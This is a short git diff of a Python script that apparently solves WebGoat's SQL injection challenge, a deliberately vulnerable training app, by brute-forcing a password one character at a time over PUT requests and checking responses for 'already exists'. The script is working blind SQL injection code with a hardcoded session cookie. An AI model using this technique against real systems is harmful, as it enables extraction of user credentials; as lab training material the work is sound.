@@ -11,7 +11,7 @@ header = {
 }
 
 cookies = {
-    'JSESSIONID': '4C322D560CDACCD0285413BF07A536C9'
+    'JSESSIONID': '9643C4B44CA08F82EBD0753F4E40D5DE'
 }
 
 for x in range(1, 30):
@@ -26,11 +26,10 @@ for x in range(1, 30):
             'confirm_password_reg': '1'
         }
 
-        response = requests.put('http://jupyterhub.stud.hshl.net:8443/WebGoat/SqlInjection/challenge', data=data,
+        response = requests.put('http://jupyterhub.stud.hshl.net:8080/WebGoat/SqlInjection/challenge', data=data,
                                 headers=header, cookies=cookies)
         if 'already exists' in response.text:
             password += letters[i]
             print(password)
             break
-        else:
-            print('Not quite right: ' + password + letters[i])
+        #print('Not quite right: ' + password + letters[i])
